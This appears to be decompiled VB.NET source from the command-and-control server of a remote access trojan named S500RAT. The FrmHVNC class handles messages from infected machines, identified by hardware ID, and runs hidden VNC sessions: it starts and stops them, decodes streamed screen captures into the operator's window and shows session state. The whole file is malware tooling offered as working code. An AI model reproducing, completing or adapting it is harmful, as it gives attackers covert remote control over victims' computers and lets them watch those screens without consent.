Imports System
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Windows.Forms
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection

Namespace S500RAT
	' Token: 0x0200004E RID: 78
	Public Class FrmHVNC
		' Token: 0x06001191 RID: 4497 RVA: 0x00099970 File Offset: 0x00097B70
		Public Sub Capture(client As Clients, unpack_msgpack As MsgPack)
			Try
				Dim asString As String = unpack_msgpack.ForcePathObject("Command").AsString
				If Operators.CompareString(asString, "setClient", False) <> 0 Then
					If Operators.CompareString(asString, "Start", False) <> 0 Then
						If Operators.CompareString(asString, "Stop", False) <> 0 Then
							If Operators.CompareString(asString, "Screen", False) <> 0 Then
								If Operators.CompareString(asString, "State", False) <> 0 Then
									If Operators.CompareString(asString, "Error", False) = 0 Then
										Dim formHiddenProgram As FormHiddenProgram = CType(Application.OpenForms("FormHVNC" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormHiddenProgram)
										Dim flag As Boolean = formHiddenProgram IsNot Nothing
										If flag Then
											formHiddenProgram.StateHApp.ForeColor = Color.Red
											formHiddenProgram.StateHApp.Text = "Error : " + unpack_msgpack.ForcePathObject("Error").AsString
										End If
									End If
								Else
									Dim formHVNC As FormHVNC = CType(Application.OpenForms("FormHVNC" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormHVNC)
									Dim flag2 As Boolean = formHVNC IsNot Nothing
									If flag2 Then
										Dim asString2 As String = unpack_msgpack.ForcePathObject("State").AsString
										Dim flag3 As Boolean = asString2.Contains("Error")
										If flag3 Then
											formHVNC.StateHvnc.ForeColor = Color.Red
											formHVNC.StartAndStop.Enabled = True
											formHVNC.StartAndStop.Text = "Start"
											formHVNC.StartAndStop.FillColor = Color.FromArgb(26, 155, 161)
											formHVNC.StartAndStop.FillColor2 = Color.FromArgb(26, 155, 161)
										Else
											Dim flag4 As Boolean = asString2.Contains("NB")
											If flag4 Then
												formHVNC.StateHvnc.ForeColor = Color.FromArgb(255, 128, 0)
											Else
												Dim flag5 As Boolean = asString2.Contains("Ready")
												If flag5 Then
													formHVNC.StartAndStop.Enabled = True
												Else
													formHVNC.StateHvnc.ForeColor = Color.FromArgb(26, 155, 161)
												End If
											End If
										End If
										formHVNC.StateHvnc.Text = unpack_msgpack.ForcePathObject("State").AsString
									End If
								End If
							Else
								Dim formHVNC2 As FormHVNC = CType(Application.OpenForms("FormHVNC" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormHVNC)
								Dim flag6 As Boolean = formHVNC2 IsNot Nothing
								If flag6 Then
									Try
										Dim asBytes As Byte() = unpack_msgpack.ForcePathObject("Stream").GetAsBytes()
										Dim bitmap As Bitmap = formHVNC2.decoder.DecodeData(New MemoryStream(asBytes))
										Dim syncPicbox As Object = formHVNC2.syncPicbox
										ObjectFlowControl.CheckForSyncLockOnValueType(syncPicbox)
										SyncLock syncPicbox
											formHVNC2.PictureBox1.Image = bitmap
											Dim formHVNC3 As FormHVNC = formHVNC2
											Dim ptr As Integer = formHVNC3.IntFPS
											formHVNC3.IntFPS = ptr + 1
											formHVNC2.rdSize = bitmap.Size
											Dim flag8 As Boolean = formHVNC2.sw.ElapsedMilliseconds >= 1000L
											If flag8 Then
												formHVNC2.FPS.Text = Conversions.ToString(formHVNC2.IntFPS)
												formHVNC2.sw = Stopwatch.StartNew()
												formHVNC2.SizeImage.Text = Functions.BytesToSize(CLng(asBytes.Length))
												formHVNC2.IntFPS = 0
											End If
										End SyncLock
									Catch ex As Exception
									End Try
								End If
							End If
						Else
							Dim formHVNC4 As FormHVNC = CType(Application.OpenForms("FormHVNC" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormHVNC)
							Dim flag9 As Boolean = formHVNC4 IsNot Nothing
							If flag9 Then
								formHVNC4.QualityUsing.Enabled = True
								formHVNC4.StartAndStop.Enabled = True
								formHVNC4.StartAndStop.Text = "Start"
							End If
						End If
					Else
						Dim formHVNC5 As FormHVNC = CType(Application.OpenForms("FormHVNC" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormHVNC)
						Dim flag10 As Boolean = formHVNC5 IsNot Nothing
						If flag10 Then
							formHVNC5.QualityUsing.Enabled = False
							formHVNC5.StartAndStop.Enabled = True
							formHVNC5.StartAndStop.Text = "Stop"
						End If
					End If
				Else
					Dim formHVNC6 As FormHVNC = CType(Application.OpenForms("FormHVNC" + unpack_msgpack.ForcePathObject("Hwid").AsString), FormHVNC)
					Dim flag11 As Boolean = formHVNC6 IsNot Nothing
					If flag11 Then
						Dim flag12 As Boolean = formHVNC6.Client Is Nothing
						If flag12 Then
							client.ID = unpack_msgpack.ForcePathObject("Hwid").AsString
							formHVNC6.Client = client
							formHVNC6.Timer1.Enabled = True
						End If
					End If
				End If
			Catch ex2 As Exception
				ListLogs.AddArray("PowerShell " + client.IP + " Error : " + ex2.Message, 0)
			End Try
		End Sub
	End Class
End Namespace
